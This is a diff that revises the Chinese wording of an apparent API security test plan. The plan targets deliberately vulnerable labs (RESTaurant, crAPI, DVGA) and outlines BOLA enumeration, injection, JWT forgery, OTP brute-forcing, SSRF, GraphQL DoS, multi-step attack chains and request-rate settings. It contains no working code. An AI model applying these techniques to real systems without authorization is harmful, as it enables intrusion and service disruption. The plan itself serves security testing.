-**BOLA 测试：** 枚举顺序 ID，交换请求中的用户标识符，在没有所有权的情况下访问资源。
+**BOLA 测试：** 枚举顺序 ID，在请求中替换用户标识符，访问非本人所有的资源。
 
-**注入测试：** 在 filter/coupon 参数中使用 SQL 载荷，GraphQL 查询注入，通过参数字段的 OS 命令注入。
+**注入测试：** 在 filter/coupon 参数中注入 SQL 载荷，GraphQL 查询注入，通过参数字段进行 OS 命令注入。
 
-**认证绕过测试：** 伪造 JWT 令牌，暴力破解 OTP，使用已弃用的 API 版本，算法混淆。
+**认证绕过测试：** 伪造 JWT Token，爆破 OTP，使用已废弃的 API 版本，算法混淆攻击。
 
 **SSRF 测试：** 在 `importPaste`、`image_url` 和 `mechanic_api` 参数中使用内部 URL。
 
-**DoS 测试：** GraphQL 批量/递归/别名攻击，使用高次数的 `repeat_request_if_failed`。
+**DoS 测试：** GraphQL 批量/递归/别名攻击，将 `repeat_request_if_failed` 设置为较大次数。
 
-### 阶段 3：有状态的攻击链
+### 阶段三：有状态攻击链
 
-某些攻击需要具有状态的多步骤序列：
+部分攻击需要多步骤序列并维持状态：
 
-1. **RESTaurant 提权链：** 注册 → 获取令牌 → PATCH 角色为 Chef → 重新认证 → 命令注入
-2. **crAPI 完整流程：** 注册 → 验证邮箱 (MailHog) → 登录 → 添加车辆 → 联系技师 (SSRF) → 订单操纵
-3. **DVGA 侦察到利用：** 自省 → 发现 systemDiagnostics → 暴力破解管理员凭据 → OS 命令执行
+1. **RESTaurant 提权链：** 注册 → 获取 Token → PATCH 角色为 Chef → 重新认证 → 命令注入
+2. **crAPI 完整流程：** 注册 → 验证邮箱（MailHog） → 登录 → 添加车辆 → 联系技师（SSRF） → 订单操纵
+3. **DVGA 侦察到利用：** 自省查询 → 发现 systemDiagnostics → 爆破管理员凭据 → 执行 OS 命令
 
 ### 速率建议
 
-| 模式 | 请求/秒 | 持续时间 | 备注 |
+| 模式 | 请求数/秒 | 持续时间 | 备注 |
 |---|---|---|---|
 | 基线（每个应用） | 10-50 | 5 分钟 | 建立正常流量指纹 |
 | BOLA 枚举 | 100-500 | 2 分钟 | 顺序 ID 扫描 |
-| OTP 暴力破解 | 1000+ | 直到找到 | 最多 10,000 次尝试（4 位数字） |
-| GraphQL DoS | 10-50 | 30 秒 | 每个请求在服务端开销很大 |
-| 注入模糊测试 | 50-200 | 5 分钟 | 每个请求使用不同的载荷 |
-| SSRF 探测 | 5-20 | 2 分钟 | 速度较慢；每次触发服务端 HTTP 请求 |
+| OTP 爆破 | 1000+ | 直至成功 | 最多 10,000 次尝试（4 位数字） |
+| GraphQL DoS | 10-50 | 30 秒 | 每个请求对服务器侧消耗较大 |
+| 注入模糊测试 | 50-200 | 5 分钟 | 每次请求使用不同载荷 |
+| SSRF 探测 | 5-20 | 2 分钟 | 速度慢；每次触发服务器侧 HTTP 请求 |
